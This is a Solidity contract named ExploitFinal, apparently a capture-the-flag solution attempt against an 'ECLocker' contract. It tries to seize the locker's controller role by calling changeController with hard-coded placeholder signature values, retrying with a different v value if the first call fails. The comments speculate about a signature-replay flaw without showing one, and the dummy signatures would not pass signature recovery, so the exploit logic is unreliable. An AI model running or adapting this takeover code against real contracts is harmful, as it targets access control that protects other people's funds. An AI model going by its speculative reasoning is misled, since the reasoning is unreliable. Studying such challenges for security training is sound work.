// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function controller() external view returns (address);
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function lockId() external view returns (uint256);
    function msgHash() external view returns (bytes32);
}

contract ExploitFinal {
    IECLocker public locker;
    
    constructor(address _locker) {
        locker = IECLocker(_locker);
    }
    
    function exploit() public {
        // The vulnerability is that the syntax:
        // keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]))
        // is invalid and might always return the same value or behave unpredictably
        
        // Since we need a valid signature that ecrecover returns the controller address,
        // but the signature hash check might be broken, we can potentially:
        // 1. Use any valid signature for the controller
        // 2. The broken hash might not properly track used signatures
        
        // Let's craft a message and signature
        uint256 lockId = locker.lockId(); // 1337
        
        // Calculate the message hash the same way the constructor does
        bytes32 msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32")
            mstore(0x1C, lockId)
            msgHash := keccak256(0x00, 0x3c)
        }
        
        // For testing, let's use dummy signature values
        // In a real attack, we'd need a valid signature from the controller
        // But if the hash check is broken, we might be able to reuse signatures
        
        uint8 v = 28; // Valid v values are 27 or 28
        bytes32 r = bytes32(uint256(0x1234567890123456789012345678901234567890123456789012345678901234));
        bytes32 s = bytes32(uint256(0x9876543210987654321098765432109876543210987654321098765432109876));
        
        // Try to change controller
        try locker.changeController(v, r, s, msg.sender) {
            // Success
        } catch {
            // Try with different values
            v = 27;
            locker.changeController(v, r, s, msg.sender);
        }
    }
    
    function trySpecificSignature(uint8 v, bytes32 r, bytes32 s) public {
        locker.changeController(v, r, s, msg.sender);
    }
}